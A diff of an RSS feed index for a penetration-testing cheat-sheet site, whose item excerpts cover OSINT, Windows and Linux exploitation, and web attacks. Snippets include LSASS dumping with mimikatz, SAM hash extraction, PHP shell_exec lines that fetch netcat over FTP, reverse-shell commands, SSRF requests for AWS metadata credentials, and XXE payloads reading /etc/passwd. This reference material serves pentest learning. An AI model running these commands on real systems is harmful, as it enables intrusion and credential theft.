@@ -47,7 +47,7 @@ Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to
       
       <guid>/open-source-intelligence-osint/technical-recon/domain_ip/</guid>
       <description>Identification Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx 
-Online Passive Identification Tools # Many passive tests can be done http://www.ipvoid.com/ # Informations about the target https://securitytrails.com/ # When you have a name or a e-mail adress you can perform a reverse whois lookup to find domain # names oned by a person of a company https://viewdns.</description>
+Online Passive Identification Tools # You can identify IP block owned by a company ipv4info.com # Then you can find domains and subdomains associated to an IP by using Passive Reverse DNS https://www.virustotal.com/gui/home/search RiskIQ Passive DNS # Many passive tests can be done # Reverse IP Lookup to find new domains http://www.</description>
     </item>
     
     <item>
@@ -65,8 +65,8 @@ Online Passive Identification Tools # Many passive tests can be done http://www.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
-      <description>From non-auth user to local admin in 3 steps # Nullsession net use \\dc\ipc$ &amp;#34;&amp;#34; /u:&amp;#34;&amp;#34; # Search for cpasswords in gpo&amp;#39;s: dir \\dc\sysvol\contoso.corp\Policies -r -I *.xml | Select-String cPassword &amp;gt;&amp;gt; dump.txt # Decrypt the cPassword gpp-decrypt &amp;lt;string&amp;gt; 
-Getting and cracking LDPA user hash # STEP 1: Dump target user hash: ldapsearch –x –h &amp;lt;LDAP_IPAddr&amp;gt; -D &amp;#34;cn=Directory Manager&amp;#34; -w &amp;lt;password&amp;gt; -b &amp;#39;uid=&amp;lt;target_username&amp;gt;,cn=users,cn=accounts,dc=&amp;lt;DOMAIN&amp;gt;,dc=COM&amp;#39; uid userpassword krbprincipalkey sambalmpassword sambantpassword # STEP 2: The ‘userpassword::’ and ‘krbprincipalkey::’ hash is base64 encoded and now you need to decode it: echo &amp;#39;e1NTSEF9dHZEaUZ4ejJTUkRBLzh1NUZSSGVIT2N4WkZMci9OYktQNHNLNWc9PQ==&amp;#39; | base64 --decode {SSHA}tvDiFxz2SRDA/8u5FRHeHOcxZFLr/NbKP4sK5g== # STEP 3: Place your decoded hash into hash.</description>
+      <description>Dumping LSASS # If you are SYSTEM and need creds, you can dump lsass.exe and then use Mimikatz in local procdump.exe -ma lsass.exe lsadump.dmp copy lsadump.dmp \\IP\yourshare\lsadump.dmp # Then mimikatz... privilege::debug sekurlsa::minidump lsadump.dmp sekurlsa:logonPasswords /full 
+Extracting NTLM hashes from SAM database # samdump2 allows you to extract NTLM hashes from the SAM database # You need to have SAM and SYSTEM files locally samdump2 SYSTEM SAM &amp;gt; hashes.txt</description>
     </item>
     
     <item>
@@ -79,6 +79,15 @@ Getting and cracking LDPA user hash # STEP 1: Dump target user hash: ldapsearch 
 It then launch a geotool webpage to get more informations about the website you are visiting About IP &amp;amp; Domain.
 Google Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.
 If the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.</description>
+    </item>
+    
+    <item>
+      <title>General Informations</title>
+      <link>/pwn/general_infos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/pwn/general_infos/</guid>
+      <description>MISC - Tricks # Checking program/binary protections checksec --file ./binary # Getting more informations about an ELF readelf -a ./binary # Gettign system() adress # Can be simple objdump -D ./binary | grep system # Getting known string (&amp;#34;GNU&amp;#34; for example) # Look for objdump -s ./binary# Getting padding using pwntools &amp;gt;&amp;gt; from pwn import * # Generate pattern &amp;gt;&amp;gt; cyclic(400) ## Find offset where SIGSEGV &amp;gt;&amp;gt; find_cyclic(&amp;#39;&amp;lt;RSPoffset&amp;gt;&amp;#39;) &amp;gt;&amp;gt; find_cyclic(&amp;#39;yaac&amp;#39;)# You can list gadgets using ROPGadgets.</description>
     </item>
     
     <item>
@@ -103,10 +112,10 @@ Attack modes -a 0 # Straight : hash dict -a 1 # Combination : hash dict dict -a 
     
     <item>
       <title>IPBX</title>
-      <link>/other-systems/todo/</link>
+      <link>/other-systems/ipbx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/other-systems/todo/</guid>
+      <guid>/other-systems/ipbx/</guid>
       <description># You can browse to the following URL to get all users registered with an extension 178.33.47.167/panel/ # Sipvicious is a great tool to attack VoIP # You can bruteforce a special extension/account ./svcrack.py -u 2000 178.33.47.167 -d ./notre_dictionnaire -vv</description>
     </item>
     
@@ -116,8 +125,8 @@ Attack modes -a 0 # Straight : hash dict -a 1 # Combination : hash dict dict -a 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/linkedin/</guid>
-      <description>ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. # Provide a search string # Ouput as XLSX but intented to work with Google Sheets # After importing you&amp;#39;ll have a dataset and report worksheet # Dataset : First name, last name, occupation, industry, profile URL, picture URL # Report : Picture (displayed), Full name, occupation, Link to profile 
-linkScrape # linkScrape is another enumeration tool # Pure Web Scrapper → It does not use the LinkedIn API # /!</description>
+      <description># Check the &amp;#34;see coordinates&amp;#34; on accounts # Sometimes, people link other resources 
+ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. # Provide a search string # Ouput as XLSX but intented to work with Google Sheets # After importing you&amp;#39;ll have a dataset and report worksheet # Dataset : First name, last name, occupation, industry, profile URL, picture URL # Report : Picture (displayed), Full name, occupation, Link to profile</description>
     </item>
     
     <item>
@@ -184,7 +193,7 @@ LLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they&amp;#3
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/php-vulnerabilities/php_filters/</guid>
-      <description>PHP Filters # Base64 ?</description>
+      <description>PHP Filters # Base64 ?inc=php://filter/read=convert.base64-encode/resource=config.php# iconv conversion filter can be used (https://gynvael.coldwind.pl/?lang=en&amp;amp;id=671) # allows you to use iconv to convert all processed data from charset A to charset B # where both character sets can be chosen from a surprisingly long list of supported encodings iconv -l # Example &amp;lt;?php $url = &amp;#34;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&amp;lt;&amp;gt;text&amp;#34;; echo file_get_contents($url); // Output: // some+ADwAPg-text # Then you can use it to change the charset of your payload php://filter/convert.</description>
     </item>
     
     <item>
@@ -314,8 +323,8 @@ Decipher encrypted aes256cbc file using openssl # Key d49af309a4c69382ff07bc6f83
       
       <guid>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</guid>
       <description>Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it  
-Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.com/jordanpotti/AWSBucketDump 
-Teh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS account and set your API key in ~/.aws/credentials [default] aws_access_key_id = &amp;lt;key&amp;gt; aws_secret_access_key = &amp;lt;secret&amp;gt; # Then just run it ./bucketeer.sh &amp;lt;target&amp;gt; &amp;lt;target&amp;gt;</description>
+AWS Bucket access (SSRF for example) # You can get informations and secret about an S3 bucket # Credentials, main goal http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ # You might need the zone http://169.254.169.254/latest/dynamic/instance-identity/document # Then set # AWS_ACCESS_KEY_ID # AWS_SECRET_ACCESS_KEY # AWS_DEFAULT_REGION # AWS_SESSION_TOKEN 
+Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.</description>
     </item>
     
     <item>
@@ -342,8 +351,9 @@ Teh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/network-and-domain-recon/domain_recon/</guid>
-      <description>RPC # You can use rpc to enumerate domain objects rpcclient -U &amp;lt;user&amp;gt; &amp;lt;IP-DC&amp;gt; rpcclient $&amp;gt; enumdomusers rpcclient $&amp;gt; enumdomgroups rpcclient $&amp;gt; querygroupmem 0x200 rpcclient $&amp;gt; srvinfo rpcclient $&amp;gt; querygroup 0x42 rpcclient $&amp;gt; queryuser 0x42 rpcclient $&amp;gt; getdompwinfo rpcclient $&amp;gt; getusrdompwinfo 0x42 
-Enumeration # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.fr ./enum4linux.pl -R 1090-1200 # windapsearch is also a very good tool to perform automated LDAP queries # Enumerate users .</description>
+      <description>Tips # Enumerate sessions net session \\computer 
+RPC # You can use rpc to enumerate domain objects rpcclient -U &amp;lt;user&amp;gt; &amp;lt;IP-DC&amp;gt; rpcclient $&amp;gt; enumdomusers rpcclient $&amp;gt; enumdomgroups rpcclient $&amp;gt; querygroupmem 0x200 rpcclient $&amp;gt; srvinfo rpcclient $&amp;gt; querygroup 0x42 rpcclient $&amp;gt; queryuser 0x42 rpcclient $&amp;gt; getdompwinfo rpcclient $&amp;gt; getusrdompwinfo 0x42 
+Enumeration # You can use enum4linux to enumerate domain users # You can try anonymous binding sudo enum4linux domaine.</description>
     </item>
     
     <item>
@@ -372,7 +382,8 @@ The Harvester # theHarvester is a famous OSINT and scrapping tool for passiv rec
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/file_transfer/</guid>
-      <description>Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;ftp -n &amp;lt; /usr/local/databases/ftp.</description>
+      <description>NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a 
+Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.</description>
     </item>
     
     <item>
@@ -392,8 +403,8 @@ MIME Type # Classical, using Burp for example Content-Type: application/x-php �
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/tty_full/</guid>
-      <description>Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt; 
-Spawning a shell # Using os.system echo os.system(&amp;#39;/bin/bash&amp;#39;)# Using interactive sh /bin/sh -i# Using Perl, Ruby or Lua perl -e &amp;#39;exec &amp;#34;/bin/sh&amp;#34;;&amp;#39; perl: exec &amp;#34;/bin/sh&amp;#34;; ruby: exec &amp;#34;/bin/sh&amp;#34;; lua: os.</description>
+      <description>MISC # RLWRAP allows you to interface local and remote keyboards # It gives access to keyboard arrows and history rlwrap ncat -lvp port 
+Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt;</description>
     </item>
     
     <item>
@@ -433,6 +444,15 @@ DNS Zone Transfer # Zone transfer using dig dig @challenge01.root-me.org -p 5401
       <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
       <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
 Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
+    </item>
+    
+    <item>
+      <title>MISC</title>
+      <link>/other-systems/misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/other-systems/misc/</guid>
+      <description> RTSP and VLC # RTSP (Real Time Streaming Protocol) is used with IP camera # You can view it from VLC Media Player # Open Network Stream &amp;gt; rtsp://ip/endpoint</description>
     </item>
     
     <item>
@@ -586,9 +606,9 @@ Cracking shadow files unshadow passwd shadow &amp;gt; shadowjohn.txt john --word
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</guid>
-      <description> Test for directory traversal  
+      <description>Test for directory traversal  
 General &amp;amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ 
-Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39;</description>
+Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39; # Admin wordlist patator http_fuzz url=&amp;#39;url/FILE0&amp;#39; 0=wordlist/admin.</description>
     </item>
     
     <item>
@@ -597,7 +617,7 @@ Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/network-and-domain-recon/domain_mapping/</guid>
-      <description>BloodHound Setup # Bloodhound directement depuis la machine cible # apt-get install bloodhound # Setup $ sudo neo4j console ... ... http://localhost:7474 user/pass = neo4j/neo4j # Start $ bloodhound URL : bolt://127.0.0.1:7687 Target Collection # On the target, drop the Sharphound ingestor # You can drop it through shared folder or by download https://github.com/BloodHoundAD/BloodHound https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 # Powershell Powershell.exe -Exec Bypass Import-Module .\Sharphound.ps1 Invoke-Bloodhound Invoke-BloodHound -CollectionMethod All # Default : Domains, Computers, Users, Groups # All : Domains, Computers, Users, Groups, OUs, GPOs # Exe # You may need some .</description>
+      <description>BloodHound Tips # Right Click # Get information about the node and also how to compromise the user / machine # Owned # Can be usefull during an internal pentest to note where you are # Nodes will be tagged with a skull # It&amp;#39;s then possible to ask the shortest path to a node from the owned ones # Filters # Can be usefull # Shortcuts # CTRL --&amp;gt; Change node display # CTRL+SHIFT+I --&amp;gt; Developper Tools # CTRL+R --&amp;gt; Reload display # Still possible to edit data to set what you want# If you don&amp;#39;t have access to a domain machine but have creds # You can run from host runas /netonly /user:FQDN.</description>
     </item>
     
     <item>
@@ -741,7 +761,8 @@ ICMP Exfiltration 2 #!/usr/bin/env python from scapy.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/exploitation/impacket/</guid>
-      <description>TODO</description>
+      <description>Table of Content  General Remote Execution Kerberos Windows Secrets Server Tools / MiTM Attacks WMI Known vulnerabilities SMB/MSRPC MSSQL/TDS File Formats Others  
+General # Almost every Impacket scripts follows the same option syntax authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don&#39;t ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) connection: -dc-ip ip address IP Address of the domain controller.</description>
     </item>
     
     <item>
@@ -750,8 +771,8 @@ ICMP Exfiltration 2 #!/usr/bin/env python from scapy.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/instagram/</guid>
-      <description>Tips &amp;amp; Tricks # Webstagram allows you to browse any Instagram account https://web.stagram.com # Grampsy https://gramfly.com/ # Instagram photo and video downloader https://downloadgram.com/ # SaveIG (public profiles) https://saveig.com 
-Instaloader (https://github.com/instaloader/instaloader) # Downloads public and private profiles, hashtags, user stories,feeds and saved media, # Downloads comments, geotags and captions of each post, # Automatically detects profile name changes and renames the targetdirectory accordingly, # Allows fine-grained customization of filters and where to storedownloaded media.</description>
+      <description>Tips &amp;amp; Tricks # Webstagram allows you to browse any Instagram account https://web.stagram.com # Grampsy https://gramfly.com/ # Instagram photo and video downloader https://downloadgram.com/ # SaveIG (public profiles) https://saveig.com # Full size Instagram photos https://www.instadp.com/ 
+InstagramOSINT (https://github.com/sc1341/InstagramOSINT) # The Instagram OSINT Tool gets a range of information from an Instagram account # that you normally wouldn&amp;#39;t be able to get from just looking at their profile # Username # Profile Name # URL # Followers # Following # Number of Posts # Bio # Profile Picture URL # Is Business Account?</description>
     </item>
     
     <item>
@@ -785,12 +806,23 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
     </item>
     
     <item>
+      <title>Searching Informations</title>
+      <link>/windows-systems/post-exploitation-techniques/searching_informations/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/post-exploitation-techniques/searching_informations/</guid>
+      <description>Scavenger # Scavenger is a tool used above CrackMapExec to automate the process # of looking for sensitive files and informations during Internal Pentest python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local $ python3 ./scavenger.py smb --target iplist --username administrator --password Password123 --domain test.local --overwrite 
+WinSCP # WinSCP is potentially exploitable in the registry if not using a master password # You can manually request the key reg.</description>
+    </item>
+    
+    <item>
       <title>Searching Someone</title>
       <link>/open-source-intelligence-osint/human-recon/searchingsomeone/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
-      <description>Searching People https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships... Infobel - Search worldwide people (white pages, yellow pages etc, you can find relations by name) MarketVisual - Map a company organization chart Numberway - Way to find others resources to get phone numbers Pipl - Search engines only for people Spokeo - Search for people information (only in USA) Usersearch - Search engine tool to find someone using pseudo/username Webmii - Search engine that compiles information on one person # Search by photo Tineye # Search on communities and blogs (reddit.</description>
+      <description>Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 
+Searching People https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships... Infobel - Search worldwide people (white pages, yellow pages etc, you can find relations by name) MarketVisual - Map a company organization chart Numberway - Way to find others resources to get phone numbers Pipl - Search engines only for people Spokeo - Search for people information (only in USA) Usersearch - Search engine tool to find someone using pseudo/username Webmii - Search engine that compiles information on one person # Search by photo Tineye # Search on communities and blogs (reddit.</description>
     </item>
     
     <item>
@@ -830,6 +862,16 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
     </item>
     
     <item>
+      <title>Wordlists &amp; Co</title>
+      <link>/passcracking-hashfiles/wordlists/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/passcracking-hashfiles/wordlists/</guid>
+      <description>Resources https://github.com/kaonashi-passwords/Kaonashi https://github.com/tarraschk/richelieu https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt https://packetstormsecurity.com/Crackers/wordlists/page4/ http://www.gwicks.net/dictionaries.htm # ... 
+CeWL # CeWL allows you to build custom wordlists based on online resources # If you know that your target is target.com, you can parse web content to build lists # Can be time consuming # 5 levels of depth and minimum 7 char per word cewl -w customwordlist.txt -d 5 -m 7 www.sans.org # Also visit and parse other sites cewl -w customwordlist.</description>
+    </item>
+    
+    <item>
       <title>XML External Entity (XXE) and XSLT</title>
       <link>/web-attacks/files-inclusions-and-injections/xxe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -837,7 +879,7 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
       <guid>/web-attacks/files-inclusions-and-injections/xxe/</guid>
       <description>Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf 
 Basic XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/read=convert.base64-encode/resource=path/index.php&amp;#34; &amp;gt; ]&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt; ]&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;# XXE via Word: &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % pe SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; %pe; ]&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;external;&amp;lt;/foo&amp;gt; &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; 
-XSLT Injection # You can execute commands through an external XML file &amp;lt;br /&amp;gt;Version: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:version&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor URL: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor-url&amp;#39;)&amp;#34; /&amp;gt; # Example &amp;lt;?</description>
+Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # And then execute entities # SVG File &amp;lt;!</description>
     </item>
     
     <item>
@@ -924,7 +966,7 @@ Usage usage: cmsmap [-f W/J/D] [-F] [-t] [-a] [-H] [-i] [-o] [-E] [-d] [-u] [-p]
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/server-side-injections/ssrf/</guid>
-      <description>https://vinc.top/2016/11/24/server-side-request-forgery 
+      <description>https://vinc.top/2016/11/24/server-side-request-forgery https://github.com/allanlw/svg-cheatsheet 
 PoC and enumeration # It is possible to prove the vulnerability by reading local files # Using the file protocol url=file:///etc/passwd # Then you can enumerate local services that are listening # Depending on the response http://localhost:&amp;lt;port&amp;gt; # It is also possible to use others protocols like gopher and dict # They don&amp;#39;t send HTTP headers and can avoid misinterpretation gopher://127.0.0.1:6379/test # Filter bypass http://127.1 instead of http://127.</description>
     </item>
     
@@ -952,8 +994,7 @@ PoC and enumeration # It is possible to prove the vulnerability by reading local
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/php-vulnerabilities/tricks_others/</guid>
-      <description>MISC # Path truncation # PHP max path is 4096 char # It is possible to bypass checks for one file, for example, by flooding the path before requesting a resource page=././././././././....... # There is a BIG difference between “$salt” and ‘$salt’. # Double quotes → interpreted as a variable # Simple quotes → interpreted as a string 
-Register Globals index.php ?</description>
+      <description>Bypass PHP disable_functions and open_basedir # PHP in Linux calls a binary (sendmail) when the mail() function is executed. # If we have putenv() allowed, we can set the environment variable &amp;#34;LD_PRELOAD&amp;#34;, so we can # preload an arbitrary shared object. Our shared object will execute our custom # payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example. # Chankro tool is used for that (https://github.</description>
     </item>
     
     <item>
@@ -1058,7 +1099,7 @@ Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_nam
       
       <guid>/windows-systems/exploitation/file_transfer/</guid>
       <description>/etc/init.d/pure-ftpd 
-SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords 
+SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwordsimpacket smbserver net use z: \\attackerip\sharename 
 Build a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 &amp;gt; ftp.</description>
     </item>
     
@@ -1068,9 +1109,8 @@ Build a FTP and transfer file # Set up a ftp downloading script on the target ma
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
-      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php 
-SocialBlade # Socialblade is an online tool where you can see and analyze Youtube, Instagram, Twitch, Twitter or Dailymotion accounts https://socialblade.com/twitter/user/***REMOVED*** 
-Youtube # Yasiv is an online tool allowing to map links and relations between Youtube videos https://yasiv.</description>
+      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig 
+Deblurring images # Gaussian Blur # Install GIMP Plugin &amp;#34;G&amp;#39;MIC&amp;#34; # Filters&amp;gt;G’MIC&amp;gt;Details&amp;gt;Sharpen (Deblur)# Pixelize # The Pixelize blur works by dividing an image into a number of squares # and then replacing all the pixels in each square by average of their values.</description>
     </item>
     
     <item>
@@ -1117,7 +1157,19 @@ Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/burpsuite/</guid>
-      <description>TODO</description>
+      <description>WORK IN PROGRESS 
+Modules / Addons TODO 
